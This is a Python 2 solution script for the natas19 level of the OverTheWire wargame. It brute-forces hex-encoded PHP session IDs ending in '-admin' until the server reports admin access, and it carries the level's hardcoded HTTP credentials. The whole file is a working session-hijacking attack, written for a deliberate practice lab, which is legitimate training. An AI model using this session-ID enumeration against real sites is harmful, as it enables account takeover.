#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import requests

# url = "http://natas19.natas.labs.overthewire.org?debug&username=admin&password=*"
url = "http://natas19.natas.labs.overthewire.org"
for i in range(560,641):
    if i % 20 == 0:
        enc_sessid = (str(i)+'-admin').encode('hex')
        print "SESSID:", i, enc_sessid
    cookies = dict(PHPSESSID=enc_sessid)
    print "Old:", cookies
    cookies = dict(PHPSESSID=(str(i)+'-admin').encode('hex'))
    print "New:", cookies
    r = requests.post(url, cookies=cookies, auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"))
    if "You are an admin" in r.text:
        print r.content
        exit()
